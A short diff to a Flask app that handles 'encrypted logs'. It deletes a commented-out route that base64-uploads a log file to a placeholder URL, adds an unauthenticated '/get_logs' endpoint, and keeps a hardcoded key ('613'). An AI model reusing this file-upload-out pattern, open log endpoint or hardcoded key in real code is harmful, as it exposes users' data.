@@ -14,17 +14,11 @@ ENCRYPTED_LOG_FILE = "encrypted_logs.json"
 ENCRYPTION_KEY = "613".encode('utf-8')
 
 
-# url = "https://example.com/upload"
-#
-# @app.route('/get_file', methods=['GET'])
-# def upload_file():
-#     with open("encrypted_logs.txt", "rb") as f:
-#         encoded_content = base64.b64encode(f.read()).decode("utf-8")
-#     data = {"filename": "encrypted_logs.txt", "content": encoded_content}
-#     headers = {"Content-Type": "application/json"}
-#     response = requests.post(url, json=data, headers=headers)
-#     print(response.text)
-#     return 'Data received', 200
+@app.route('/get_logs', methods=['GET'])
+def get_logs():
+    logs_data = JSONFileHandler.read_logs()
+    return jsonify(logs_data), 200
+
 
 @app.route('/start', methods=['GET'])
 def start():
